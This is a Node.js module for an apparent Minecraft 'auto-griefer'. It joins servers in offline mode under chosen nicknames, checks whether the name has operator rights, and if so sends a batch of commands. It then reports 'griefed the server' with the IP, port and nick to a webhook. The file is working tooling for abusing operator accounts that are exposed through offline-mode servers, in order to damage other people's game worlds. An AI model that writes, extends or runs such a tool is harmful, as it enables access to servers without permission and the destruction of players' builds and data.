const mineflayer = require('mineflayer');
const fs = require('fs').promises;
const { sendToWebhook, sanitizeString } = require('./utils');
const settings = require('./settings.json');

async function operateBot(ip, port, username, commands, server, version) {
  if (!username?.trim()) {
    return { skipServer: false, botSuccess: false };
  }

  console.log(`[Connection] Login attempt with nickname ${username} на ${ip}:${port}. Create skip_bot.txt to skip the bot or skip_server.txt to skip the server.`);
  
  let bot = null;
  let isDisconnected = false;
  const timeouts = new Set();
  let isOperator = false;
  let operatorCheckDone = false;
  let operatorCheckTimedOut = false;

  const cleanup = () => {
    timeouts.forEach(clearTimeout);
    timeouts.clear();
    if (bot && !bot.ended) {
      try { bot.end(); } catch (e) {}
    }
    isDisconnected = true;
  };

  try {
    const options = {
      host: ip,
      port,
      username: username.trim(),
      auth: 'offline',
      version: false,
      connectTimeout: settings.connectTimeout,
      checkTimeoutInterval: settings.checkTimeoutInterval
    };

    bot = mineflayer.createBot(options);

    const sendAllCommands = async (resolve) => {
      if (isDisconnected) return;
      if (operatorCheckTimedOut) {
        console.log(`[Information] Operator verification timed out for ${username}`);
        cleanup();
        resolve({ skipServer: false, botSuccess: false });
        return;
      }

      console.log(`[Команда] Sending all commands (${commands.length}) для ${username}`);
      let commandsSent = 0;
      const interval = settings.commandInterval;

      const sendNextCommand = async () => {
        if (isDisconnected) return;
        if (commandsSent >= commands.length) {
          console.log(`[Conclusion] All commands for ${username} sent`);
          cleanup();
          resolve({ skipServer: false, botSuccess: true });
          return;
        }

        const command = commands[commandsSent];
        console.log(`[Команда] ${commandsSent + 1}/${commands.length}: ${command} для ${username}`);
        
        try {
          bot.chat(command);
          if (commandsSent === 0) {
            const safeNick = sanitizeString(username);
            const safeVersion = sanitizeString(version);
            const message = `An auto-griefer griefed the server - ${ip}:${port} version - ${safeVersion} - nick - ${safeNick}`;
            await sendToWebhook(message);
          }
        } catch (err) {
          console.log(`[Error] Error sending command: ${err.message}`);
        }

        commandsSent++;
        if (commandsSent < commands.length) {
          const timeout = setTimeout(sendNextCommand, interval);
          timeouts.add(timeout);
        } else {
          const finalTimeout = setTimeout(() => {
            if (!isDisconnected) {
              console.log(`[Conclusion] All commands have been sent`);
              cleanup();
              resolve({ skipServer: false, botSuccess: true });
            }
          }, settings.finalCommandTimeout);
          timeouts.add(finalTimeout);
        }
      };

      await sendNextCommand();
    };

    const skipCheck = async () => {
      try {
        if (await fs.access('skip_bot.txt').then(() => true).catch(() => false)) {
          await fs.unlink('skip_bot.txt');
          console.log(`[Pass] Detected skip_bot.txt for ${username}`);
          return 'bot';
        }
        if (await fs.access('skip_server.txt').then(() => true).catch(() => false)) {
          await fs.unlink('skip_server.txt');
          console.log(`[Pass] skip_server.txt found for ${ip}:${port}`);
          return 'server';
        }
        return null;
      } catch (err) {
        console.log(`[Error] During the pass file check: ${err.message}`);
        return null;
      }
    };

    return await new Promise((resolve) => {
      const operationTimeout = setTimeout(() => {
        if (!isDisconnected) {
          console.log(`[Time-out] General timeout for ${username} на ${ip}:${port}`);
          cleanup();
          resolve({ skipServer: false, botSuccess: false });
        }
      }, settings.operationTimeout);
      timeouts.add(operationTimeout);

      const skipInterval = setInterval(async () => {
        const skipType = await skipCheck();
        if (skipType && !isDisconnected) {
          cleanup();
          clearInterval(skipInterval);
          console.log(`[Pass] Connection for ${username} omitted (${skipType})`);
          resolve({ skipServer: skipType === 'server', botSuccess: false });
        }
      }, settings.skipCheckInterval);
      timeouts.add(skipInterval);

      bot.once('spawn', () => {
        console.log(`[Success] Bot ${username} spawned at ${ip}:${port}`);
        console.log(`[Examination] Checking operator rights for ${username}`);
        
        try {
          bot.chat('/gamerule sendCommandFeedback true');
        } catch (err) {
          console.log(`[Error] Error sending check command: ${err.message}`);
        }

        const operatorCheckTimeout = setTimeout(() => {
          if (!operatorCheckDone && !isDisconnected) {
            console.log(`[Information] Automatic continuation for ${username} (operator verification timeout)`);
            operatorCheckDone = true;
            operatorCheckTimedOut = true;
            cleanup();
            resolve({ skipServer: false, botSuccess: false });
          }
        }, settings.operatorCheckTimeout);
        timeouts.add(operatorCheckTimeout);
      });

      bot.on('message', (msg) => {
        const message = msg.toString();
        
        if (message.includes('Gamerule sendCommandFeedback is now set to: true')) {
          console.log(`[Success] Bot ${username} is an operator on the server ${ip}:${port}`);
          operatorCheckDone = true;
          isOperator = true;
          
          const sendTimeout = setTimeout(() => {
            if (!isDisconnected) {
              sendAllCommands(resolve);
            }
          }, settings.sendCommandsDelay);
          timeouts.add(sendTimeout);
          
        } else if (message.includes('Unknown or incomplete command') ||
                   message.includes('You do not have permission to use this command') ||
                   message.includes('I cannot let you do that')) {
          console.log(`[Error] Bot ${username} does not have operator rights on the server ${ip}:${port}`);
          cleanup();
          resolve({ skipServer: false, botSuccess: false });
        }

        if (message.includes('<') && message.includes('>')) {
          console.log(`[Chat] ${message}`);
        } else if (message.includes(']') && !message.includes('[Команда]')) {
          console.log(`[Answer] ${message}`);
        }
      });

      bot.on('kicked', (reason) => {
        if (!isDisconnected) {
          console.log(`[Event] Bot ${username} they'll kick With ${ip}:${port} (cause: ${JSON.stringify(reason)})`);
          cleanup();
          resolve({ skipServer: false, botSuccess: false });
        }
      });

      bot.on('error', (err) => {
        if (!isDisconnected) {
          console.log(`[Error] Connection error for ${username} на ${ip}:${port}: ${err.message}`);
          cleanup();
          resolve({ skipServer: false, botSuccess: false });
        }
      });

      bot.on('end', (reason) => {
        if (!isDisconnected) {
          console.log(`[Event] Bot ${username} completed connection with ${ip}:${port}`);
          cleanup();
          resolve({ skipServer: false, botSuccess: false });
        }
      });
    });

  } catch (err) {
    console.log(`[Error] ${err.message}`);
    cleanup();
    return { skipServer: false, botSuccess: false };
  }
}

module.exports = { operateBot };